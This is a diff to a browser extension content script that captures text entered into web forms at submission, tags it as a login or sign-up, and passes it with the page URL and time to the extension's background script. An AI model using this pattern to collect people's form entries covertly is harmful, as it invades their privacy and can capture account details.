@@ -5,6 +5,8 @@ document.addEventListener("submit", function(e) {
   var mForm;
   var mTexts;
   
+  var mType;
+  
   var mDate;
   var mLocalTime;
   
@@ -16,6 +18,11 @@ document.addEventListener("submit", function(e) {
         mForm = mInputs[i].form;
         mTexts = $("#" + mForm.id + " :text").serializeArray();
         
+        if(mTexts.length > 1)
+          mType = "Sign-up";
+        else
+          mType = "Login";
+      
         // get the current URL
         mURL = document.URL;
         
@@ -24,7 +31,7 @@ document.addEventListener("submit", function(e) {
         mLocalTime = (mDate.getMonth()+1) + '/' + mDate.getDate() + '/' + mDate.getFullYear() + ' ' + mDate.getHours() + ':' + mDate.getMinutes() + ':' + mDate.getSeconds();
         
         // send the mesasge to the background
-        chrome.runtime.sendMessage({action: "GetInput", url: mURL, data: mTexts, time: mLocalTime}, function(response) {
+        chrome.runtime.sendMessage({action: "GetInput", url: mURL, type: mType, data: mTexts, time: mLocalTime}, function(response) {
           alert("Communication is done!");
         });
         
